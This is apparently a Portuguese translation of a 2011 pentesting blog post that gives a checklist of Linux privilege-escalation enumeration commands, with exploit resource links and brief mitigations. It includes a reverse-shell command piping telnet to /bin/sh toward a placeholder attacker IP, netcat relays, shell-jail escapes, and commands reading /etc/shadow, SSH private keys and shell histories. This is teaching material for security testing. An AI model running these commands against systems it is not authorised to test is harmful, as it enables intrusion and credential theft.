Escalação básica de privilégios do Linux
Antes de começar, gostaria de salientar que não sou especialista . Pelo que eu sei, não existe uma resposta “mágica” nesta enorme área. Esta é simplesmente a minha descoberta, digitada, para ser compartilhada (meu ponto de partida ) . Abaixo está uma mistura de comandos para fazer a mesma coisa, olhar as coisas em um lugar diferente ou apenas com uma luz diferente. Eu sei que há mais "coisas" para procurar. É apenas um guia básico e aproximado . Nem todos os comandos funcionarão para cada sistema, pois o Linux varia muito. "Isso" não vai pular da tela - você tem que caçar aquela "coisinha" , pois " o diabo está nos detalhes ".

A enumeração é a chave.
O escalonamento de privilégios (Linux) tem tudo a ver com:

Coletar - Enumeração , mais enumeração e mais enumeração.
Processo - Classifique os dados, analise e priorize.
Pesquisa - Saiba o que procurar e onde encontrar o código de exploração.
Adaptar - Personalize o exploit para que ele se encaixe. Nem todo exploit funciona para todos os sistemas "prontos para uso".
Try - Prepare-se para (muitas) tentativas e erros .
Sistema operacional
Qual é o tipo de distribuição? Qual versão?
1 
2 
3 
4
cat /etc/issue
cat /etc/*-release
  cat /etc/lsb-release      # Debian based
  cat /etc/redhat-release   # Redhat based
Qual é a versão do kernel? É de 64 bits?
1 
2 
3 
4 
5 
6
cat /proc/version
uname -a
uname -mrs
rpm -q kernel
dmesg | grep Linux
ls /boot | grep vmlinuz-
O que pode ser aprendido com as variáveis ​​ambientais?
1 
2 
3 
4 
5 
6 
7
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc
cat ~/.bash_logout
env
set
Existe uma impressora?
1
lpstat -a
Aplicativos e serviços
Quais serviços estão em execução? Qual serviço tem qual privilégio de usuário?
1 
2 
3 
4
ps aux
ps -ef
top
cat /etc/services
Quais serviços estão sendo executados pelo root? Desses serviços, que são vulneráveis ​​– vale a pena conferir!
1 
2
ps aux | grep root
ps -ef | grep root
Quais aplicativos estão instalados? Qual versão eles são? Eles estão em execução atualmente?
1 
2 
3 
4 
5 
6
ls -alh /usr/bin/
ls -alh /sbin/
dpkg -l
rpm -qa
ls -alh /var/cache/apt/archivesO
ls -alh /var/cache/yum/
Alguma das configurações do(s) serviço(s) está configurada incorretamente? Há algum plug-in (vulnerável) anexado?
1 
2 
3 
4 
5 
6 
7 
8 
9 
10
cat /etc/syslog.conf
cat /etc/chttp.conf
cat /etc/lighttpd.conf
cat /etc/cups/cupsd.conf
cat /etc/inetd.conf
cat /etc/apache2/apache2.conf
cat /etc/my.conf
cat /etc/httpd/conf/httpd.conf
cat /opt/lampp/etc/httpd.conf
ls -aRl /etc/ | awk '$1 ~ /^.*r.*/
Quais trabalhos estão agendados?
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12
crontab -l
ls -alh /var/spool/cron
ls -al /etc/ | grep cron
ls -al /etc/cron*
cat /etc/cron*
cat /etc/at.allow
cat /etc/at.deny
cat /etc/cron.allow
cat /etc/cron.deny
cat /etc/crontab
cat /etc/anacrontab
cat /var/spool/cron/crontabs/root
Algum nome de usuário e/ou senha em texto simples?
1 
2 
3 
4
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"   # Joomla
Comunicações e redes
Quais NIC(s) o sistema possui? Está conectado a outra rede?
1 
2 
3
/sbin/ifconfig -a
cat /etc/network/interfaces
cat /etc/sysconfig/network
Quais são as configurações de rede? O que você pode descobrir sobre essa rede? Servidor DHCP? Servidor dns? Porta de entrada?
1 
2 
3 
4 
5 
6
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname
Quais outros usuários e hosts estão se comunicando com o sistema?
1 
2 
3 
4 
5 
6 
7 
8 
9 
10
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w
O que está em cache? Endereços IP e/ou MAC
1 
2 
3
arp -e
route
/sbin/route -nee
A detecção de pacotes é possível? O que pode ser visto? Ouça o trânsito ao vivo
1
tcpdump tcp dst 192.168.1.7 80 and tcp dst 10.5.5.252 21
Nota: tcpdump tcp dst [ip] [porta] e tcp dst [ip] [porta]

Você tem uma concha? Você pode interagir com o sistema?
1 
2 
3
nc -lvp 4444    # Attacker. Input (Commands)
nc -lvp 4445    # Attacker. Ouput (Results)
telnet [atackers ip] 44444 | /bin/sh | [local ip] 44445    # On the targets system. Use the attackers IP!
Nota: http://lanmaster53.com/2011/05/7-linux-shells-using-built-in-tools/

O encaminhamento de porta é possível? Redirecione e interaja com o tráfego de outra visualização
Nota: http://www.boutell.com/rinetd/

Nota: http://www.howtoforge.com/port-forwarding-with-rinetd-on-debian-etch

Observação: http://downloadcenter.mcafee.com/products/tools/foundstone/fpipe2_1.zip

Nota: FPipe.exe -l [porta local] -r [porta remota] -s [porta local] [IP local]

1
FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
Nota: ssh -[L/R] [porta local]:[ip remoto]:[porta remota] [usuário local]@[ip local]

1 
2
ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
Nota: backpipe mknod p ; nc -l -p [porta remota] < backpipe | nc [IP local] [porta local] > backpipe

1 
2 
3
mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.5.5.151 80 >backpipe    # Port Relay
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
O tunelamento é possível? Envie comandos localmente, remotamente
1 
2
ssh -D 127.0.0.1:9050 -N [username]@[ip]
proxychains ifconfig
Informações confidenciais e usuários
Quem é você? Quem está logado? Quem está logado? Quem mais está aí? Quem pode fazer o quê?
1 
2 
3 
4 
5 
6 
7 
8 
9
id
who
w
last
cat /etc/passwd | cut -d: -f1    # List of users
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'   # List of super users
awk -F: '($3 == "0") {print}' /etc/passwd   # List of super users
cat /etc/sudoers
sudo -l
Quais arquivos confidenciais podem ser encontrados?
1 
2 
3 
4
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/
Alguma coisa "interessante" no(s) diretório(s) inicial(is)? Se for possível acessar
1 
2
ls -ahlR /root/
ls -ahlR /home/
Existe alguma senha; scripts, bancos de dados, arquivos de configuração ou arquivos de log? Caminhos e locais padrão para senhas
1 
2 
3
cat /var/apache2/config.inc
cat /var/lib/mysql/mysql/user.MYD
cat /root/anaconda-ks.cfg
O que o usuário está fazendo? Existe alguma senha em texto simples? O que eles estão editando?
1 
2 
3 
4 
5
cat ~/.bash_history
cat ~/.nano_history
cat ~/.atftp_history
cat ~/.mysql_history
cat ~/.php_history
Quais informações do usuário podem ser encontradas?
1 
2 
3 
4
cat ~/.bashrc
cat ~/.profile
cat /var/mail/root
cat /var/spool/mail/root
As informações da chave privada podem ser encontradas?
1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key
Sistemas de arquivos
Quais arquivos de configuração podem ser gravados em /etc/? Capaz de reconfigurar um serviço?
1 
2 
3 
4 
5 
6 
7
ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone
ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner
ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group
ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other

find /etc/ -readable -type f 2>/dev/null               # Anyone
find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone
O que pode ser encontrado em /var/ ?
1 
2 
3 
4 
5 
6 
7
ls -alh /var/log
ls -alh /var/mail
ls -alh /var/spool
ls -alh /var/spool/lpd
ls -alh /var/lib/pgsql
ls -alh /var/lib/mysql
cat /var/lib/dhcp3/dhclient.leases
Alguma configuração/arquivo (oculto) no site? Algum arquivo de configurações com informações do banco de dados?
1 
2 
3 
4 
5
ls -alhR /var/www/
ls -alhR /srv/www/htdocs/
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/
ls -alhR /var/www/html/
Há alguma coisa no(s) arquivo(s) de log (pode ajudar com "Arquivo Local Inclui"!)

1 
2 
3 
4 
5 
6 
7 
8 
9 
10 
11 
12 
13 
14 
15 
16 
17 
18 
19 
20 
21 
22 
23 
24 
25 
26 
27 
28 
29 
30 
31 
32 33 
34 
35 
36 
37 
38 
39 
40
cat /etc/httpd/logs/access_log
cat /etc/httpd/logs/access.log
cat /etc/httpd/logs/error_log
cat /etc/httpd/logs/error.log
cat /var/log/apache2/access_log
cat /var/log/apache2/access.log
cat /var/log/apache2/error_log
cat /var/log/apache2/error.log
cat /var/log/apache/access_log
cat /var/log/apache/access.log
cat /var/log/auth.log
cat /var/log/chttp.log
cat /var/log/cups/error_log
cat /var/log/dpkg.log
cat /var/log/faillog
cat /var/log/httpd/access_log
cat /var/log/httpd/access.log
cat /var/log/httpd/error_log
cat /var/log/httpd/error.log
cat /var/log/lastlog
cat /var/log/lighttpd/access.log
cat /var/log/lighttpd/error.log
cat /var/log/lighttpd/lighttpd.access.log
cat /var/log/lighttpd/lighttpd.error.log
cat /var/log/messages
cat /var/log/secure
cat /var/log/syslog
cat /var/log/wtmp
cat /var/log/xferlog
cat /var/log/yum.log
cat /var/run/utmp
cat /var/webmin/miniserv.log
cat /var/www/logs/access_log
cat /var/www/logs/access.log
ls -alh /var/lib/dhcp3/
ls -alh /var/log/postgresql/
ls -alh /var/log/proftpd/
ls -alh /var/log/samba/

Note: auth.log, boot, btmp, daemon.log, debug, dmesg, kern.log, mail.info, mail.log, mail.warn, messages, syslog, udev, wtmp
Nota: http://www.thegeekstuff.com/2011/08/linux-var-log-files/

Se os comandos forem limitados, você sai do shell "jail"?
1 
2 
3
python -c 'import pty;pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
Como os sistemas de arquivos são montados?
1 
2
mount
df -h
Existe algum sistema de arquivos não montado?
1
cat /etc/fstab
Quais "Permissões avançadas de arquivo do Linux" são usadas? Pedaços pegajosos, SUID e GUID
1 
2 
3 
4 
5 
6 
7 
8 
9
find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.
find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.
find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.

find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID
for i in `locate -r "bin$"`; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)

# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)
find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null
De onde pode ser gravado e executado? Alguns lugares 'comuns': /tmp, /var/tmp, /dev/shm
1 
2 
3 
4 
5 
6 
7
find / -writable -type d 2>/dev/null      # world-writeable folders
find / -perm -222 -type d 2>/dev/null     # world-writeable folders
find / -perm -o w -type d 2>/dev/null     # world-writeable folders

find / -perm -o x -type d 2>/dev/null     # world-executable folders

find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders
Algum arquivo "problemático"? Arquivos "ninguém" graváveis ​​em palavras
1 
2
find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files
find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files
Preparação e localização de código de exploração
Quais ferramentas/linguagens de desenvolvimento são instaladas/suportadas?
1 
2 
3 
4
find / -name perl*
find / -name python*
find / -name gcc*
find / -name cc
Como os arquivos podem ser carregados?
1 
2 
3 
4 
5
find / -name wget
find / -name nc*
find / -name netcat*
find / -name tftp*
find / -name ftp
Encontrando código de exploração
http://www.exploit-db.com

http://1337day.com

http://www.securiteam.com

http://www.securityfocus.com

http://www.exploitsearch.net

http://metasploit.com/modules/

http://securityreason.com

http://seclists.org/fulldisclosure/

http://www.google.com

Encontrando mais informações sobre a exploração
http://www.cvedetails.com

http://packetstormsecurity.org/files/cve/[CVE]

http://cve.mitre.org/cgi-bin/cvename.cgi?name=[CVE]

http://www.vulnview.com/cve-details.php?cvename=[CVE]

(Rápido) Explorações "comuns". Aviso. Arquivos binários pré-compilados. Use por sua conta e risco
http://web.archive.org/web/20111118031158/http://tarantula.by.ru/localroot/

http://www.kecepatan.66ghz.com/file/local-root-exploit-priv9/

Mitigações
Alguma das informações acima é fácil de encontrar?
Experimente fazer isso! Configure um cron job que automatize script(s) e/ou produtos de terceiros

O sistema está totalmente corrigido?
Kernel, sistema operacional, todos os aplicativos, seus plugins e serviços web

1 
2
apt-get update && apt-get upgrade
yum update
Os serviços estão sendo executados com o nível mínimo de privilégios exigido?
Por exemplo, você precisa executar o MySQL como root?

Scripts Isso pode ser automatizado?!
http://pentestmonkey.net/tools/unix-privesc-check/

http://labs.portcullis.co.uk/application/enum4linux/

http://bastille-linux.sourceforge.net

Outros guias e links (rápidos)
Enumeração
http://www.0daysecurity.com/penetration-testing/enumeration.html

http://www.microloft.co.uk/hacking/hacking3.htm

Diversos
http://jon.oberheide.org/files/stackjacking-infiltrate11.pdf

http://pentest.cryptocity.net/files/operations/2009/post_exploitation_fall09.pdf

http://insidetrust.blogspot.com/2011/04/quick-guide-to-linux-privilege.html



Postado por g0tmi1k 2 de agosto de 2011 12h00 ignorando , comandos , escalação de privilégios

« Pentesting com BackTrack (PWB) + Profissional Certificado de Segurança Ofensiva (OSCP)De-ICE.net v1.2a (1.20a) {Nível 1 - Disco 3 - Versão A} »

Referência: https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
